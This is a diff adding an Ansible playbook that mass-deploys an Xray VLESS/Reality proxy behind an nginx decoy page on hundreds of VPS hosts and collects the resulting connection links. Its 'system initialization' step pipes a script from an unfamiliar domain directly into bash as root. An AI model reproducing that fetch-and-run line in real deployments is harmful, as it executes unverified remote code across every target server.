@@ -1,0 +1,46 @@
+---
+- name: 500台VPS一键部署方案
+  hosts: all
+  gather_facts: no
+  tasks:
+    - name: 执行部署逻辑 (初始化 + 伪装 + Xray)
+      shell: |
+        # 1. 系统初始化
+        wget -qO- sh.alhttdw.cn/d11.sh | bash
+        apt update && apt install -y nginx curl uuid-runtime
+        
+        # 2. 伪装页面
+        echo "<h1>Welcome to New Server</h1>" > /var/www/html/index.html
+        systemctl restart nginx
+        
+        # 3. 安装与配置 Xray
+        bash <(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)
+        UUID=$(uuidgen); KEYS=$(xray x25519)
+        PRI=$(echo "$KEYS" | awk '/Private key:/ {print $3}')
+        PUB=$(echo "$KEYS" | awk '/Public key:/ {print $3}')
+        SID=$(openssl rand -hex 8)
+        
+        cat <<EOF > /usr/local/etc/xray/config.json
+        {"inbounds":[{"port":443,"protocol":"vless","settings":{"clients":[{"id":"$UUID","flow":"xtls-rprx-vision"}],"decryption":"none"},"streamSettings":{"network":"tcp","security":"reality","realitySettings":{"show":false,"dest":"127.0.0.1:80","xver":0,"serverNames":["microsoft.com"],"privateKey":"$PRI","shortIds":["$SID"]}}}],"outbounds":[{"protocol":"freedom"}]}
+        EOF
+        systemctl restart xray
+        
+        # 4. 输出格式化结果
+        echo "vless://$UUID@{{ ansible_host }}:443?encryption=none&security=reality&sni=microsoft.com&fp=chrome&pbk=$PUB&sid=$SID&type=tcp&flow=xtls-rprx-vision#{{ inventory_hostname }}"
+      register: node_link
+      ignore_errors: yes
+
+    - name: 临时保存结果
+      delegate_to: localhost
+      copy:
+        content: "{{ node_link.stdout if node_link.rc == 0 else 'ERROR: ' + inventory_hostname }}"
+        dest: "./temp_links/{{ inventory_hostname }}.txt"
+
+- name: 结果汇总
+  hosts: localhost
+  tasks:
+    - name: 合并并清理
+      shell: |
+        mkdir -p ./temp_links
+        cat ./temp_links/*.txt > final_nodes.txt
+        rm -rf ./temp_links
